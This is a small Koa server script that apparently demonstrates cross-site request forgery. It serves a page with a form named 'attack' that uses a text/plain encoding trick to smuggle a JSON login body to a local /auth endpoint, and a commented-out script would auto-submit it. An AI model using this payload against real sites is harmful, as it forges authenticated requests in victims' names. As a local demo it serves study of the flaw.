const Koa = require('koa');
const app = new Koa();

app.use((ctx) => {
  ctx.body = `
    <form name="attack" enctype="text/plain" action="http://127.0.0.1:3000/auth" method="POST">
      <input type="hidden" name='{"from": "User2", "to": "password2"}'>
      <p>
        <button type="submit">Log In</button>
      </p>
    </form>
    <!--<script>document.attack.submit();</script>-->
  `;
});

//app.listen(3001);
app.listen(3000, '127.0.0.2');
